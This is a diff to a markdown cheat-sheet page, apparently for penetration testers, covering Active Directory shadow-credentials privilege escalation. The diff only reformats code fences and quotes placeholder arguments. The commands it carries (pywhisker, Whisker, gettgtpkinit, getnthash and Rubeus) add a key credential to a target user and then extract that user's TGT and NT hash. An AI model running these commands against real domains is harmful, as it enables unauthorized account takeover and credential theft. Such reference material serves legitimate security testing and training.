@@ -4,7 +4,6 @@ date: 2024-7-31
 tags: ["AddKeyCredentialLink", "active driectory", "ad", "Windows", "shadow credentials", "whisker", "pywhisker"]
 ---
 
----
 ### Privesc #1: Shadow credentials
 
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
@@ -15,8 +14,8 @@ tags: ["AddKeyCredentialLink", "active driectory", "ad", "Windows", "shadow cred
 
 <div>
 
-```bash
-python3 pywhisker.py --action list -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --dc-ip <DC> -t <TARGET_USER> --use-ldaps
+```console
+python3 pywhisker.py --action list -d <DOMAIN> -u <CURRENT_USER> -p '<PASSWORD>' --dc-ip <DC> -t <TARGET_USER> --use-ldaps
 ```
 
 </div>
@@ -25,8 +24,8 @@ python3 pywhisker.py --action list -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> -
 
 <div>
 
-```bash
-python3 pywhisker.py --action add -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --dc-ip <DC> -t <TARGET_USER> --use-ldaps
+```console
+python3 pywhisker.py --action add -d <DOMAIN> -u <CURRENT_USER> -p '<PASSWORD>' --dc-ip <DC> -t <TARGET_USER> --use-ldaps
 ```
 
 </div>
@@ -35,7 +34,7 @@ python3 pywhisker.py --action add -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --
 
 <div>
 
-```bash
+```console
 # Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type'
 pip3 install -I pyopenssl==24.0.0
 ```
@@ -46,8 +45,8 @@ pip3 install -I pyopenssl==24.0.0
 
 <div>
 
-```bash
-sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASSWORD> <DOMAIN>/<USERNAME> <USERNAME>.ccache -dc-ip <DC>
+```console
+sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<PFX_PASSWORD>' '<DOMAIN>/<USERNAME>' <USERNAME>.ccache -dc-ip <DC>
 ```
 
 </div>
@@ -56,7 +55,7 @@ sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <
 
 <div>
 
-```bash
+```console
 export KRB5CCNAME=<USERNAME>.ccache
 ```
 
@@ -66,8 +65,8 @@ export KRB5CCNAME=<USERNAME>.ccache
 
 <div>
 
-```bash
-python3 getnthash.py <DOMAIN>/<USERNAME> -key <AS-REP_encryption_key>
+```console
+python3 getnthash.py '<DOMAIN>/<USERNAME>' -key <AS_REP_ENC_KEY>
 ```
 
 </div>
@@ -83,7 +82,7 @@ python3 getnthash.py <DOMAIN>/<USERNAME> -key <AS-REP_encryption_key>
 
 <div>
 
-```powershell
+```console
 .\Whisker.exe list /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC>
 ```
 
@@ -93,8 +92,8 @@ python3 getnthash.py <DOMAIN>/<USERNAME> -key <AS-REP_encryption_key>
 
 <div>
 
-```powershell
-.\Whisker.exe add /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC> /password:<PASSWORD>
+```console
+.\Whisker.exe add /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC> /password:'<PASSWORD>'
 ```
 
 </div>
@@ -103,8 +102,8 @@ python3 getnthash.py <DOMAIN>/<USERNAME> -key <AS-REP_encryption_key>
 
 <div>
 
-```powershell
-.\rubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_CERT> /password:<PASSWORD> /domain:<DOMAIN> /dc:<DC> /getcredentials /show
+```console
+.\rubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_CERT> /password:'<PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
 ```
 
 </div>
